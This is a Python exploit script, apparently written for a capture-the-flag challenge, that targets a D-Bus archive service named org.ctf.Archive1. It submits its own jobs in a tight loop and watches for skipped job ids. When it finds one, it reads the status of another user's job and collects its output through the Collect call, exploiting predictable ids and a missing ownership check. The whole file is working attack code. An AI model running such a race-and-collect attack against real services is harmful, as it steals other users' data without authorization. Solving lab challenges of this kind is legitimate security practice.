#!/usr/bin/env python3
"""Race the D-Bus job-id counter: submit our own 'welcome' jobs in a tight
loop, self-collect each one immediately, and the moment our own returned
id sequence skips by more than 1, grab the skipped id (the coordinator's
job) via GetStatus/Collect before it gets reaped.
"""
import dbus
import re
import time
import sys

bus = dbus.bus.BusConnection("unix:path=/run/archive-bus/bus")
obj = bus.get_object("org.ctf.Archive1", "/org/ctf/Archive1")
mgr = dbus.Interface(obj, "org.ctf.Archive1.Manager")

def job_iface(path):
    jo = bus.get_object("org.ctf.Archive1", path)
    return dbus.Interface(jo, "org.ctf.Archive1.Job")

def extract_id(path):
    m = re.search(r"j(\d+)$", str(path))
    return int(m.group(1)) if m else None

last_id = None
caught = []
deadline = time.time() + 45
iteration = 0

while time.time() < deadline and not caught:
    iteration += 1
    try:
        path = mgr.Submit("welcome")
    except Exception as e:
        print(f"[submit err] {e}", file=sys.stderr)
        time.sleep(0.1)
        continue
    cur_id = extract_id(path)
    if last_id is not None and cur_id is not None and cur_id > last_id + 1:
        # gap! ids last_id+1 .. cur_id-1 belong to someone else
        for gid in range(last_id + 1, cur_id):
            gpath = f"/org/ctf/Archive1/jobs/j{gid}"
            try:
                ji = job_iface(gpath)
                status = ji.GetStatus()
                print(f"[GAP id={gid}] status={status}")
                try:
                    fd = ji.Collect()
                    fdnum = fd.take()
                    data = b""
                    while True:
                        chunk = __import__("os").read(fdnum, 65536)
                        if not chunk:
                            break
                        data += chunk
                    __import__("os").close(fdnum)
                    print(f"[GAP id={gid}] COLLECTED {len(data)} bytes:")
                    print(data.decode(errors="replace"))
                    caught.append((gid, data))
                except Exception as ce:
                    print(f"[GAP id={gid}] collect failed: {ce}")
            except Exception as ie:
                print(f"[GAP id={gid}] inspect failed: {ie}")
    last_id = cur_id
    # self-collect our own probe job immediately to avoid LimitExceeded
    try:
        ji = job_iface(path)
        try:
            fd = ji.Collect()
            fdnum = fd.take()
            __import__("os").close(fdnum)
        except Exception:
            pass
    except Exception:
        pass
    time.sleep(0.03)

print(f"\n[done] iterations={iteration} caught={len(caught)}")
if not caught:
    print("[done] no coordinator job caught in this window")
